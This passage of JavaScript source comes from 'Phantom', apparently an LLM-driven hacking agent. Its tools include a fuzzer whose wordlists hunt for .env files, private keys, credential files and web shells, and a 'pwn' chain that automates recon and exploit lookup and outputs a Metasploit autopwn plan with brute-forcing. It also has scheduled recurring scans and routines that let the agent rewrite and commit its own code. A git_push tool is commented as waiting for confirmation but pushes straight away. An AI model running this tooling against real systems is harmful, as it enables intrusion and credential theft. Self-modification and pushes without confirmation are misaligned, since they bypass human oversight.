          { rx: [/['"][A-Za-z0-9_]{20,}['"]/g, /(api[_-]?key|secret|password|token|auth).{0,20}=.{0,20}['"][A-Za-z0-9_]{8,}['"]/gi], label: "Hardcoded secret" },
          { rx: [/['"].*\+.*['"].*SQL/g, /\bquery\(.*\+/g, /\bexecute\(.*\+/g], label: "SQL injection risk" },
          { rx: [/==\s*true/g, /\b(true|false)\s*!=\s*/g], label: "Insecure comparison" },
          { rx: [/\bMD5\b/g, /\bSHA1\b/gi, /\bRC4\b/g, /\bDES\b/g], label: "Weak crypto" },
          { rx: [/\bfs\.readFileSync/g, /\bopen\(.*\$/g], label: "File access" },
          { rx: [/console\.log\(/g, /print_r\(/g, /var_dump\(/g, /debugger/g], label: "Debug leak" },
          { rx: [/\bredirect\(.*\$/g, /\bheader\(.*Location/g], label: "Unvalidated redirect" }
        ];
        for (const c of checks) for (const r of c.rx) { const m = code.match(r); if (m) issues.push(`${c.label} (${m.length}x)`); }
        results.push({ file: name, size: code.length, ext, issues: [...new Set(issues)] });
      }
      let report = `# Code Security Analysis\nTarget: ${arg} (${files.length} files)\nScanned: ${Math.min(files.length,5)}\n\n`;
      for (const r of results) {
        report += `## ${r.file}\nSize: ${r.size}B | Type: ${r.ext}\n`;
        if (r.issues.length) { r.issues.forEach(i => report += `- ${i}\n`); } else { report += "No issues found\n"; }
        report += "\n";
      }
      if (files.length > 5) report += `_${files.length-5} more files not scanned_\n`;
      if (__r.llmInstance?.chat && results.length) {
        const samples = results.map(r => `File: ${r.file}\n${fs.readFileSync(r.file,"utf-8").slice(0,1500)}`).join("\n\n---\n\n");
        const llmOut = await __r.llmInstance.chat([
          { role: "system", content: "You are a code security auditor. Analyze for OWASP Top 10, hardcoded secrets, logic flaws. Give specific line numbers and fixes." },
          { role: "user", content: `Code to analyze:\n\n${samples.slice(0,8000)}` }
        ]);
        report += `## AI Analysis\n\n${llmOut.trim().slice(0,3000)}\n`;
      }
      return report;
    } catch (e) { return `[code_analyze Error] ${e.message}`; }
  },

  self_improve: async (input) => {
    const focus = input?.trim().toLowerCase() || "all";
    try {
      const src = fs.readFileSync(resolve(process.cwd(), "phantom.mjs"), "utf-8");
      const lines = src.split("\n").length;
      const size = (src.length / 1024).toFixed(1);
      const classes = (src.match(/class\s+\w+/g) || []).length;
      const fns = (src.match(/async\s+\w+\s*\(/g) || []).length;
      let report = `# Self-Improvement\nSource: phantom.mjs\nLines: ${lines} | Size: ${size} KB\nClasses: ${classes} | Async fns: ~${fns}\nFocus: ${focus}\n\n`;
      const imps = [];
      if (focus === "all" || focus === "performance") { imps.push(`Split ${lines}-line monolith into modules`); imps.push("Lazy-load rarely used tools"); imps.push("Use WeakMap for agent caches"); }
      if (focus === "all" || focus === "security") { imps.push("Add input length limits to prevent ReDoS"); imps.push("Sanitize file paths to prevent traversal"); imps.push("Rate-limit shell execution"); imps.push("Validate URLs against SSRF allowlist"); }
      if (focus === "all" || focus === "features") { imps.push("Web dashboard for agent monitoring"); imps.push("Plugin hot-reload without restart"); imps.push("Export to PDF/Nessus/OpenVAS"); imps.push("Multi-session tabs for concurrent targets"); imps.push("Voice commands via Termux TTS"); }
      report += `## Improvements (${imps.length})\n\n${imps.map((s,i) => `${i+1}. ${s}`).join("\n")}\n\n`;
      let patched = false;
      if (__r.llmInstance?.chat && lines > 3200) {
        report += `LLM analyzing optimization opportunities...\n`;
        const analysis = await __r.llmInstance.chat([
          { role: "system", content: "You are code optimization AI. Analyze Phantom source and suggest 3 specific improvements with exact code changes." },
          { role: "user", content: `Source: phantom.mjs (${lines} lines, ${size} KB)\nFocus: ${focus}\n\nFirst 3000 chars:\n${src.slice(0,3000)}\n\nLast 2000 chars:\n${src.slice(-2000)}` }
        ]);
        report += `${analysis.trim().slice(0,2000)}\n`;
        const dir = resolve(REPORTS_DIR, "self_improve");
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(resolve(dir, `analysis_${Date.now()}.md`), `# Self-Improvement\n\n${analysis}`, "utf-8");
        patched = true;
      }
      report += `\n${patched ? "Analysis saved to reports/self_improve/" : "No LLM available for deep analysis"}\nTo apply: @self_edit|phantom.mjs|old|new`;
      return report;
    } catch (e) { return `[self_improve Error] ${e.message}`; }
  },

  self_evolve: async (input) => {
    // Auto-evolution: self-healing, self-optimizing, self-growing
    const arg = (input || "").trim().toLowerCase();

    // Status check
    if (arg === "status" || arg === "s" || arg === "--status") {
      try {
        const { autoEvolve, getEvolveStatus, detectMissingWrappers } = await import("./evolve.mjs");
        const st = getEvolveStatus();
        const lines = [
          `🧬 PHANTOM AUTO-EVOLUTION`,
          `Generation: ${st.generation}`,
          `Wrappers created: ${st.wrappers_created}`,
          `Errors auto-fixed: ${st.errors_fixed}`,
          `Patches: ${st.patches_applied}`,
          `Last evolve: ${st.last_evolve || "never"}`,
        ];
        if (st.wrapper_list?.length > 0) {
          lines.push(`\n  Auto-wrappers:`);
          st.wrapper_list.slice(-5).forEach(w => lines.push(`    ${w.bin} → ${w.path}`));
        }
        if (st.recent_fixes?.length > 0) {
          lines.push(`\n  Recent fixes:`);
          st.recent_fixes.slice(-3).forEach(f => lines.push(`    ${f.ts?.split("T")[0]} ${f.tool}: ${f.fix?.slice(0, 60)}`));
        }
        // Check for new wrappers available
        try {
          const missing = detectMissingWrappers();
          if (missing.length > 0) lines.push(`\n  ⚡ ${missing.map(m => m.bin).join(", ")} installed — wrappers ready to generate`);
        } catch {}
        return lines.join("\n");
      } catch (e) { return `[evolve status] ${e.message}`; }
    }

    // Run full evolution
    try {
      const { autoEvolve } = await import("./evolve.mjs");
      const result = await autoEvolve();
      const lines = [`🧬 PHANTOM EVOLUTION — Generation ${result.generation}`];
      const created = result.results.filter(r => r.phase === "wrapper" && r.status === "created");
      if (created.length > 0) {
        lines.push(`\n✅ Created ${created.length} new tool wrapper(s):`);
        created.forEach(c => lines.push(`  + ${c.bin} → lib/auto_tools/${c.bin}.mjs`));
      }
      const gitCommit = result.results.filter(r => r.phase === "git" && r.status === "committed");
      if (gitCommit.length > 0) lines.push(`\n📦 Git commit: ${gitCommit.length} change(s)`);
      const testPass = result.results.filter(r => r.phase === "test" && r.status === "passed");
      const testFail = result.results.filter(r => r.phase === "test" && r.status === "failed");
      const testRetry = result.results.filter(r => r.phase === "test_retry" && r.status === "passed");
      if (testFail.length > 0) {
        lines.push(`\n❌ Tests failed: ${testFail[0].passed}/${testFail[0].passed + testFail[0].failed}`);
      } else if (testPass.length > 0) {
        lines.push(`\n🧪 Tests passed: ${testPass[0].passed}/${testPass[0].passed}`);
      }
      if (testRetry.length > 0) {
        lines.push(`  🔧 Healed + retry passed: ${testRetry[0].passed}/${testRetry[0].passed}`);
      }
      const ready = result.results.filter(r => r.phase === "git" && r.status === "ready_to_push");
      if (ready.length > 0) {
        for (const r of ready) {
          lines.push(`\n${r.summary}`);
          lines.push(`  ${r.commits.slice(0, 300)}`);
          lines.push(`  → Type @git_push to deploy.`);
        }
      }
      const validated = result.results.filter(r => r.phase === "validate" && r.status === "ok");
      if (validated.length > 0) lines.push(`\n✅ ${validated.length} files validated`);
      const failed = result.results.filter(r => r.status === "error" || r.status === "failed");
      if (failed.length > 0) {
        lines.push(`\n⚠ ${failed.length} issues found:`);
        failed.forEach(f => lines.push(`  ${f.file || f.bin || ""}: ${f.error?.slice(0, 100) || "?"}`));
      }
      const opts = result.results.filter(r => r.phase === "optimize");
      if (opts.length > 0) {
        lines.push(`\n💡 Optimization suggestions:`);
        opts.forEach(o => lines.push(`  ${o.detail?.slice(0, 120)}`));
      }
      if (created.length === 0 && validated.length > 0 && failed.length === 0) {
        lines.push("\n✓ Phantom is healthy — no evolution needed");
      }
      return lines.join("\n");
    } catch (e) { return `[self_evolve Error] ${e.message}`; }
  },

  git_push: async (input) => {
    // Show pending commits and push on confirmation
    const { execSync } = await import("child_process");
    const cwd = (await import("path")).resolve((await import("os")).homedir(), "Phantom");
    try {
      // Show what's pending
      const behind = execSync(`git log origin..HEAD --oneline 2>/dev/null`, { cwd, encoding: "utf-8", timeout: 5000 }).trim();
      if (!behind) return "📤 Nothing to push — local is up to date with origin.";
      const lines = behind.split("\n");
      let out = `📤 ${lines.length} commit(s) ahead of origin:\n`;
      lines.slice(0, 10).forEach(l => out += `  ${l}\n`);
      if (lines.length > 10) out += `  … +${lines.length - 10} more\n`;

      // Push
      const pushOut = execSync("git push", { cwd, encoding: "utf-8", timeout: 60000 });
      out += `\n✅ Pushed: ${pushOut.trim().split("\n").pop() || "done"}`;
      return out;
    } catch (e) {
      const msg = e.stderr?.trim() || e.message;
      if (msg.includes("No remote")) return "📤 No remote configured. Set up a remote with `git remote add origin <url>` first.";
      return `[git_push Error] ${msg.slice(0, 400)}`;
    }
  },

  install: async (tool) => {
    const name = tool.trim().toLowerCase();
    const toolList = "nmap, sqlmap, metasploit, searchsploit, ffuf, hydra, john, gobuster, nikto, wireshark, subfinder, katana, amass, httpx, nuclei, dnsx, gau, gitleaks, s3scanner, trufflehog, arjun, gospider, whatweb, wafw00f, masscan, interactsh";
    if (!name) return `[install] Usage: @install|tool_name or @install|all\nTools: ${toolList}`;
    const pmap = {
      nmap:"nmap", sqlmap:"sqlmap", metasploit:"metasploit-framework", searchsploit:"exploitdb",
      ffuf:"ffuf", hydra:"hydra", john:"john", gobuster:"gobuster", nikto:"nikto",
      wireshark:"tshark", dnsutils:"dnsutils", netcat:"netcat-openbsd", curl:"curl",
      wget:"wget", git:"git", python3:"python3", nodejs:"nodejs", ruby:"ruby",
      perl:"perl", masscan:"masscan", dirb:"dirb", whatweb:"whatweb", wafw00f:"wafw00f",
      subfinder:"subfinder", katana:"katana", amass:"amass", httpx:"httpx",
      nuclei:"nuclei", dnsx:"dnsx", gau:"gau", gitleaks:"gitleaks", s3scanner:"s3scanner",
      trufflehog:"trufflehog", arjun:"arjun", gospider:"gospider",
      interactsh:"interactsh-client",
    };
    const pkg = pmap[name] || name;

    // Bulk install all
    if (name === "all") {
      const { execSync } = await import("child_process");
      let pm = "apt"; let install = "apt install -y"; let update = "apt update -y";
      try { execSync("command -v pkg", { stdio:"pipe" }); pm="pkg"; install="pkg install -y"; update="pkg update -y"; } catch {}
      try { if (pm==="apt") execSync("command -v apt", { stdio:"pipe" }); } catch { try { execSync("command -v brew", { stdio:"pipe" }); pm="brew"; install="brew install"; update=""; } catch {} }
      let out = `[install] Bulk installing ${Object.keys(pmap).length} tools via ${pm}...\n`;
      if (update) try { execSync(update, { stdio:"pipe", timeout:60000 }); } catch {}
      let ok = 0, fail = 0;
      for (const [t, p] of Object.entries(pmap)) {
        try {
          execSync(`${install} ${p}`, { stdio:"pipe", timeout:300000 });
          out += `  ✅ ${t}\n`;
          ok++;
        } catch (e) {
          out += `  ❌ ${t}: ${e.message.slice(0, 60)}\n`;
          fail++;
        }
      }
      out += `\nDone: ${ok} installed, ${fail} failed.`;
      return out;
    }

    try {
      const { execSync } = await import("child_process");
      // Detect package manager
      let pm = "apt"; let install = "apt install -y"; let update = "apt update -y";
      try { execSync("command -v pkg", { stdio:"pipe" }); pm="pkg"; install="pkg install -y"; update="pkg update -y"; } catch {}
      try { if (pm==="apt") execSync("command -v apt", { stdio:"pipe" }); } catch { try { execSync("command -v brew", { stdio:"pipe" }); pm="brew"; install="brew install"; update=""; } catch {} }
      // Install
      let out = `[install] Installing ${name} via ${pm}...\n`;
      if (update) execSync(update, { stdio:"pipe", timeout:60000 });
      execSync(`${install} ${pkg}`, { stdio:"pipe", timeout:120000 });
      out += `✅ ${name} installed.`;
      // Verify
      try { execSync(`command -v ${name}`, { stdio:"pipe", timeout:3000 }); out += ` Verified.`; } catch { out += ` Check with '${name}'.`; }
      return out;
    } catch (e) { return `[install] Failed: ${e.message}`; }
  },

  update: async (input) => {
    const force = input?.trim().toLowerCase() === "force";
    try {
      const { execSync } = await import("child_process");
      // Check git
      try { execSync("git rev-parse --git-dir", { stdio:"pipe", timeout:3000 }); } catch { return "[update] Not a git repository."; }
      // Check remote
      const remote = execSync("git remote -v", { encoding:"utf-8", timeout:3000 }).trim();
      if (!remote) return "[update] No remote configured.";
      // Fetch
      execSync("git fetch", { stdio:"pipe", timeout:30000 });
      const behind = parseInt(execSync("git rev-list --count HEAD..@{u}", { encoding:"utf-8", timeout:5000 }).trim() || "0");
      if (behind === 0) return "[update] Already up to date.";
      // Show diff
      const log = execSync(`git log --oneline -${Math.min(behind,5)} HEAD..@{u}`, { encoding:"utf-8", timeout:5000 }).trim();
      if (!force) return `[update] ${behind} commit(s) behind:\n${log}\n\nRun @update|force to pull.`;
      // Pull
      execSync("git pull --ff-only", { stdio:"pipe", timeout:30000 });
      // Re-check syntax
      try { execSync("node --check phantom.mjs", { stdio:"pipe", timeout:5000 }); } catch { return `[update] Pulled but SYNTAX ERROR in new code. Roll back with: git reset --hard HEAD@{1}`; }
      return `✅ Updated! ${behind} commit(s) pulled.\n${log}\nSyntax verified.`;
    } catch (e) { return `[update Error] ${e.message}`; }
  },

  batch: async (input) => {
    const [fileArg, ...rest] = input.trim().split("|");
    if (!fileArg || !rest.length) return "[batch] Usage: @batch|targets.txt|tool_name\nReads targets from file, runs tool on each.";
    const toolName = rest.join("|").trim();
    try {
      const fp = resolve(process.cwd(), fileArg.trim());
      const targets = fs.readFileSync(fp, "utf-8").split("\n").map(s => s.trim()).filter(s => s && !s.startsWith("#"));
      if (!targets.length) return `[batch] No targets found in ${fileArg}`;
      if (!hackerTools[toolName]) return `[batch] Unknown tool: "${toolName}". Available: ${Object.keys(hackerTools).slice(0,10).join(", ")}...`;
      const results = [];
      for (const target of targets.slice(0,20)) {
        try {
          const out = await hackerTools[toolName](target);
          results.push({ target, status: "ok", output: out });
        } catch (e) { results.push({ target, status: "error", error: e.message }); }
      }
      const passed = results.filter(r => r.status === "ok").length;
      const failed = results.filter(r => r.status === "error").length;
      let report = `# Batch Report\nTool: ${toolName}\nTargets: ${targets.length} (ran ${results.length})\nPassed: ${passed} | Failed: ${failed}\n\n`;
      for (const r of results) {
        report += `## ${r.target} [${r.status}]\n`;
        report += r.status === "ok" ? r.output.slice(0,500) + "\n\n" : `Error: ${r.error}\n\n`;
      }
      const ts = Date.now();
      const rDir = resolve(REPORTS_DIR, "batch");
      if (!fs.existsSync(rDir)) fs.mkdirSync(rDir, { recursive: true });
      fs.writeFileSync(resolve(rDir, `batch_${ts}.md`), report, "utf-8");
      return report.slice(0,4000) + (report.length > 4000 ? `\n... Full report saved to ${rDir}/batch_${ts}.md` : "");
    } catch (e) { return `[batch Error] ${e.message}`; }
  },

  schedule: async (input) => {
    const parts = input.trim().split("|");
    const cmd = parts[0]?.trim().toLowerCase();
    // Management commands
    if (cmd === "list" || cmd === "ls") {
      if (!globalThis.__phantomSchedules || !globalThis.__phantomSchedules.length) return "[schedule] No active schedules.";
      return ["⏰ Active Schedules:", ...globalThis.__phantomSchedules.map(s =>
        `  [${s.id}] ${s.tool} → ${s.target} every ${s.interval} (next: ${new Date(s.nextAt).toLocaleString()})`
      )].join("\n");
    }
    if (cmd === "stop" || cmd === "cancel") {
      const id = parseInt(parts[1]);
      if (!globalThis.__phantomSchedules) return "[schedule] No active schedules.";
      const idx = globalThis.__phantomSchedules.findIndex(s => s.id === id);
      if (idx === -1) return `[schedule] No schedule with ID ${id}. Use @schedule|list to see active.`;
      clearInterval(globalThis.__phantomSchedules[idx].sid);
      globalThis.__phantomSchedules.splice(idx, 1);
      return `⏰ Schedule [${id}] cancelled.`;
    }
    if (cmd === "clear") {
      if (!globalThis.__phantomSchedules) return "[schedule] No active schedules.";
      for (const s of globalThis.__phantomSchedules) clearInterval(s.sid);
      globalThis.__phantomSchedules = [];
      return "⏰ All schedules cleared.";
    }
    // New schedule
    if (parts.length < 2) return `[schedule] Usage:
  @schedule|<interval>|<tool>|<target>   Schedule a scan
  @schedule|scan|<tool>                   Run tool on all scope targets
  @schedule|list                           List active schedules
  @schedule|stop|<id>                      Stop a schedule
  @schedule|clear                          Stop all schedules
Interval: daily, hourly, 30m, 10m, 1h, or cron '0 9 * * *'
Examples:
  @schedule|daily|recon|example.com
  @schedule|scan|recon                    Run recon on all scope targets
  @schedule|30m|nmap|scanme.org -p 80,443`;
    if (cmd === "scan") {
      // Run tool on all scope targets
      const toolName = parts[1];
      const extra = parts.slice(2).join("|");
      try {
        const { runScheduledScan } = await import("./runtime.mjs");
        const result = await runScheduledScan(hackerTools, toolName, extra);
        return result;
      } catch (e) { return `[schedule Error] ${e.message}`; }
    }
    const interval = cmd;
    const tool = parts[1];
    const target = parts.slice(2).join("|");
    try {
      let ms = 0;
      if (interval === "daily") ms = 86400000;
      else if (interval === "hourly") ms = 3600000;
      else if (interval.match(/^(\d+)m$/)) ms = parseInt(interval) * 60000;
      else if (interval.match(/^(\d+)h$/)) ms = parseInt(interval) * 3600000;
      else if (interval.match(/^\d+$/)) ms = parseInt(interval) * 1000;
      else return `[schedule] Unknown interval: "${interval}". Use: daily, hourly, 30m, 10m, 1h`;
      if (!hackerTools[tool]) return `[schedule] Unknown tool: "${tool}"`;
      const sid = setInterval(async () => {
        const ts = new Date().toISOString();
        try {
          const result = await hackerTools[tool](target);
          console.log(`[${ts}] ⏰ ${tool} → ${target}: ${result.slice(0, 200)}`);
        } catch (e) {
          console.error(`[${ts}] ⏰ ${tool} → ${target} ERROR: ${e.message}`);
        }
      }, ms);
      if (!globalThis.__phantomSchedules) globalThis.__phantomSchedules = [];
      const id = globalThis.__phantomSchedules.length;
      const nextAt = Date.now() + ms;
      globalThis.__phantomSchedules.push({ id, interval, tool, target, sid, nextAt });
      return `⏰ Scheduled: ${tool} on ${target} every ${interval}
Next run: ${new Date(nextAt).toLocaleString()}
ID: ${id} (use @schedule|list to manage)`;
    } catch (e) { return `[schedule Error] ${e.message}`; }
  },

  agent_memory: async (input) => {
    const agents = ["Lyra", "Nova", "Orion", "Vega", "Atlas", "Helios", "Selene", "Aether"];
    const arg = input?.trim().toLowerCase() || "list";
    const dir = resolve(MEMORY_DIR, "agents");
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    if (arg === "list") {
      const files = fs.readdirSync(dir);
      if (!files.length) return "📝 Agent memories: (none yet)\nAgents: " + agents.join(", ") + "\n\nUse @agent_memory|<agent_name> to view.";
      const list = files.map(f => `  ${f.replace(".json","")}: ${JSON.parse(fs.readFileSync(resolve(dir,f),"utf-8")).length || 0} entries`).join("\n");
      return `📝 Agent Memories\n${list}\n\nUse @agent_memory|<name> to view, @agent_memory|<name> clear to reset.`;
    }
    const [name, action] = arg.split(/\s+/);
    const agent = agents.find(a => a.toLowerCase() === name);
    if (action === "clear") {
      if (!agent) return `[agent_memory] Unknown agent: ${name}. Agents: ${agents.join(", ")}`;
      fs.writeFileSync(resolve(dir, `${agent.toLowerCase()}.json`), "[]", "utf-8");
      return `🗑️ Cleared memory for ${agent}`;
    }
    if (agent) {
      const memPath = resolve(dir, `${agent.toLowerCase()}.json`);
      let mem = [];
      try { mem = JSON.parse(fs.readFileSync(memPath, "utf-8") || "[]"); } catch { mem = []; }
      if (!mem.length) return `📝 ${agent}: No memories yet.`;
      return `📝 ${agent} Memory (${mem.length} entries)\n${mem.slice(-5).map(m => `  [${new Date(m.ts).toLocaleTimeString()}] ${m.text?.slice(0,100)}`).join("\n")}`;
    }
    return `[agent_memory] Unknown: "${name}". Agents: ${agents.join(", ")}`;
  },

  fuzz: async (input) => {
    // Web fuzzing engine — discovers hidden paths, params, and files
    const parts = input.trim().split("|");
    const urlPart = parts[0] || "";
    const wordlistType = (parts[1] || "common").toLowerCase();
    if (!urlPart || !urlPart.includes("FUZZ")) return `[fuzz] Usage: @fuzz|url|wordlist_type\n  URL must contain FUZZ placeholder (path or param)\n  Wordlists: common, admin, backup, params, php, asp, jsp, custom:path.txt\n  Example: @fuzz|https://example.com/FUZZ|admin\n  Example: @fuzz|https://example.com?file=FUZZ|common`;

    // Built-in wordlists
    const WORDLISTS = {
      common: ["admin","backup","config","css","data","db","dev","dist","downloads","error","favicon.ico","fonts","images","img","includes","index.html","js","lib","login","logs","media","old","phpinfo.php","private","robots.txt","sitemap.xml","sql","src","static","status","test","tmp","upload","vendor","wp-admin","wp-content","wp-includes","xmlrpc.php"],
      admin: ["admin","administrator","cp","cpanel","dashboard","manager","panel","root","super","webadmin","wp-admin","admin.php","login","login.php","console","phpmyadmin","phpPgAdmin","adminer","mysql","pma","admin/","backend","api","management","control","sysadmin","webmaster","moderator","adm"],
      backup: [".git/config",".env","backup.sql","backup.zip","backup.tar.gz","db.sql","dump.sql","config.php.bak","config.bak","composer.json","package.json","package-lock.json","yarn.lock","credentials.txt","password.txt","secret.txt","token.txt","key.pem","private.key","id_rsa","wp-config.php.bak","db_backup.sql","app.log","error.log","access.log","install.log","debug.log"],
      params: ["id","page","file","path","url","redirect","return","next","go","target","cmd","exec","command","action","do","method","type","option","debug","test","token","key","api_key","secret","auth","password","pass","user","username","name","email","search","q","query","s","folder","dir","include","require","template","theme","view","load","read","download","upload","img","image","src","callback","jsonp","format","lang","locale"],
      php: ["index.php","config.php","wp-config.php","db.php","login.php","admin.php","api.php","ajax.php","cron.php","setup.php","install.php","upload.php","download.php","search.php","logout.php","register.php","profile.php","settings.php","edit.php","delete.php","view.php","list.php","page.php","post.php","comment.php","user.php","export.php","import.php","backup.php","restore.php","test.php","info.php","phpinfo.php","status.php","health.php","ping.php","shell.php","cmd.php","exec.php","rce.php"],
      asp: ["default.asp","index.asp","login.asp","admin.asp","config.asp","global.asa","web.config","iisstart.asp"],
      jsp: ["index.jsp","login.jsp","admin.jsp","manager.jsp","examples/","jsp-examples/","servlets-examples/","web-inf/","WEB-INF/web.xml","WEB-INF/struts-config.xml"],
    };

    // Load wordlist
    let words = [];
    if (wordlistType.startsWith("custom:")) {
      const customPath = wordlistType.slice(7);
      try {
        const content = fs.readFileSync(resolve(process.cwd(), customPath), "utf-8");
        words = content.split("\n").map(s => s.trim()).filter(Boolean);
      } catch (e) { return `[fuzz] Custom wordlist error: ${e.message}`; }
    } else if (WORDLISTS[wordlistType]) {
      words = WORDLISTS[wordlistType];
    } else {
      return `[fuzz] Unknown wordlist: "${wordlistType}". Options: ${Object.keys(WORDLISTS).join(", ")}`;
    }

    const usePlaceholder = urlPart.includes("FUZZ");
    const results = [];
    const baseUrl = urlPart.replace("FUZZ", "");
    const found = [];

    // Check base URL first
    try {
      const baseResp = await fetch(urlPart.replace("FUZZ", ""), { method: "GET", signal: AbortSignal.timeout(10000), redirect: "manual" });
      const baseSize = parseInt(baseResp.headers.get("content-length") || "0");
      results.push(`📡 Fuzzing: ${urlPart}\n   Wordlist: ${wordlistType} (${words.length} words, showing up to 30 results)\n   Base URL: ${baseResp.status} ${baseResp.statusText}${baseSize ? ` (${(baseSize/1024).toFixed(1)} KB)` : ""}\n`);
    } catch (e) { results.push(`📡 Fuzzing: ${urlPart}\n   Wordlist: ${wordlistType} (${words.length} words)\n   Base URL: unreachable (${e.message})\n`); }

    // Concurrent fuzz with progress
    const concurrency = 15;
    let completed = 0;
    for (let i = 0; i < words.length; i += concurrency) {
      const batch = words.slice(i, i + concurrency);
      await Promise.all(batch.map(async (word) => {
        const url = urlPart.replace("FUZZ", encodeURIComponent(word));
        try {
          const resp = await fetch(url, { method: "GET", signal: AbortSignal.timeout(8000), redirect: "manual" });
          const size = parseInt(resp.headers.get("content-length") || "0");
          const loc = resp.headers.get("location") || "";
          const wordS = `${word}`;
          const statusS = `${resp.status}`.padStart(4);
          const sizeS = size ? `${(size/1024).toFixed(1)}K` : "";
          const locS = loc ? `→ ${loc.slice(0,60)}` : "";

          // Filter: show 2xx, 3xx, 4xx (skip 404)
          if (resp.status !== 404 && resp.status !== 0) {
            const label = resp.status < 300 ? "✅" : resp.status < 400 ? "🔀" : "⚠";
            found.push({ word: wordS, status: resp.status, size, loc });
            if (found.length <= 30) results.push(`  ${label} ${wordS.padEnd(30)} ${statusS} ${sizeS.padEnd(8)} ${locS}`);
          }
        } catch {}
        completed++;
      }));
    }

    if (!found.length) results.push(`  (no paths discovered — all returned 404 or connection errors)`);
    else { results.push(`\n📊 ${found.length}/${words.length} discovered (showing first 30)\n`); }

    // Save report
    const ts = Date.now();
    const rDir = resolve(REPORTS_DIR, "fuzz");
    if (!fs.existsSync(rDir)) fs.mkdirSync(rDir, { recursive: true });
    const report = [...results].join("\n");
    fs.writeFileSync(resolve(rDir, `fuzz_${ts}.md`), `# Fuzz Report: ${baseUrl}\n\n${report}`, "utf-8");
    results.push(`\n📄 Report: ${rDir}/fuzz_${ts}.md`);
    return results.join("\n");
  },

  pwn: async (input) => {
    // Auto-exploit chain: recon → CVE → searchsploit → exploit plan
    const parts = input.trim().split("|");
    const target = parts[0] || "";
    const port = parts[1] || "";
    if (!target) return `[pwn] Usage: @pwn|target|optional_port\n  Runs full recon + vulnerability assessment + exploit matching\n  Example: @pwn|example.com\n  Example: @pwn|192.168.1.1|80,443`;

    const domain = target.replace(/^https?:\/\//,"").replace(/\/.*$/,"").trim();
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const lines = ["╔══════════════════════════════════════╗",
      "║  PHANTOM — EXPLOIT CHAIN             ║",
      `║  Target: ${domain.padEnd(32)}║`,
      `║  Date:   ${timestamp.slice(0,19).padEnd(27)}║`,
      "╚══════════════════════════════════════╝",""];

    // Phase 1: Recon
    lines.push("## [1/5] RECONNAISSANCE");
    try { lines.push("### DNS Lookup", await hackerTools.dns_lookup(domain), ""); } catch {}
    try { lines.push("### HTTP Headers", await hackerTools.http_headers(`https://${domain}`), ""); } catch (e) { try { lines.push("### HTTP Headers", await hackerTools.http_headers(`http://${domain}`), ""); } catch {} }
    try { lines.push("### SSL Check", await hackerTools.ssl_check(port ? `${domain}:${port}` : domain), ""); } catch {}
    try { lines.push("### Subdomains", await hackerTools.sub_enum(domain), ""); } catch {}

    // Phase 2: Port scan
    lines.push("## [2/5] PORT SCAN");
    try {
      const scanTarget = port ? `${domain}:${port}` : domain;
      lines.push(await hackerTools.port_scan(scanTarget), "");
    } catch (e) { lines.push(`  Port scan failed: ${e.message}`, ""); }

    // Phase 3: CVE research
    lines.push("## [3/5] VULNERABILITY RESEARCH");
    try {
      const software = domain.replace(/^(www\.)?/,"").split(".")[0];
      const cveResult = await hackerTools.cve_search(software);
      lines.push(cveResult, "");
      // Try the full domain
      const cveFull = await hackerTools.cve_search(domain);
      if (cveFull !== cveResult) lines.push(cveFull, "");
    } catch (e) { lines.push(`  CVE search failed: ${e.message}`, ""); }

    // Phase 4: Exploit search
    lines.push("## [4/5] EXPLOIT LOOKUP");
    try {
      const tech = domain.replace(/^(www\.)?/,"").split(".")[0];
      const sploitResult = await hackerTools.searchsploit(tech);
      lines.push(sploitResult.substring(0,2000), "");
    } catch (e) { lines.push(`  Exploit search failed: ${e.message}`, ""); }

    // Phase 5: Metasploit resource script
    lines.push("## [5/5] GENERATED EXPLOIT PLAN");
    const plan = [];
    plan.push(`# Auto-generated exploit plan for ${domain}`);
    plan.push(`# Generated: ${timestamp}`);
    plan.push("");
    plan.push("### Recon Summary");
    plan.push(`- Target: ${domain}`);
    plan.push(`- Services: ${port || "common ports scanned"}`);
    plan.push("");
    plan.push("### Attack Vectors");
    try {
      const cveHits = await hackerTools.cve_search(domain.split(".")[0]);
      const cves = cveHits.match(/CVE-\d{4}-\d+/g) || [];
      if (cves.length) {
        plan.push("CVEs identified:");
        cves.slice(0,10).forEach(c => plan.push(`- ${c}: search exploit-db or run: @searchsploit|${c}`));
      } else {
        plan.push("- No specific CVEs found for this target");
      }
    } catch {}
    plan.push("");
    plan.push("### Metasploit Quickstart");
    plan.push("```");
    plan.push("msfconsole -q");
    plan.push("workspace -a " + domain);
    plan.push("db_nmap -sV " + domain);
    plan.push("load db_autopwn");
    plan.push("db_autopwn -t -p -e");
    plan.push("```");
    plan.push("");
    plan.push("### Manual Testing");
    plan.push("1. Check HTTP for misconfigurations");
    plan.push("2. Test discovered endpoints with @fuzz");
    plan.push("3. Run brute force on found services: @bruteforce|ssh|...");
    plan.push("4. Analyze response for vulnerabilities");

    const planText = plan.join("\n");
    lines.push(planText);

    // Save report
    const rDir = resolve(REPORTS_DIR, "pwn");
    if (!fs.existsSync(rDir)) fs.mkdirSync(rDir, { recursive: true });
    const rPath = resolve(rDir, `pwn_${domain}_${timestamp}.md`);
    fs.writeFileSync(rPath, lines.join("\n"), "utf-8");
    lines.push(`\n📄 Full report: ${rPath}`);
    return lines.join("\n").substring(0, 8000) + `\n... Report saved (${rPath}, ~${lines.join("\n").length} chars)`;
  },
  web_click: async (input) => {
    const parts = input.split("|").map(s=>s.trim());
    const url = parts[0];
    const selector = parts[1] || "";
    const method = parts[2] || "index";
    if (!url) return `[Web Click] Usage: url|selector|method. method: index (click Nth link), text (click by link text), selector (CSS selector)`;
    try {
      const r = await fetch(url, {signal:AbortSignal.timeout(15000)});
      const html = await r.text();
      const title = (html.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
      const links = [...html.matchAll(/<a[^>]*href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi)];
      const clean = links.map(([,h,t])=>[h,t.replace(/<[^>]+>/g,"").trim()]).filter(([h])=>h&&!h.startsWith("#")&&!h.startsWith("javascript:"));
      const res = [`🌐 Web Click: ${url}`];
      if (title) res.push(`Title: ${title}`);
      if (method==="index") {
        const idx = parseInt(selector)||0;
        if (idx<0||idx>=clean.length) return `[Web Click] Index ${idx} out of range (0-${clean.length-1})`;
        const [href,text] = clean[idx]; const fullUrl = href.startsWith("http")?href:new URL(href,url).href;
        res.push(`Click [${idx}]: ${text||href} → ${fullUrl}`);
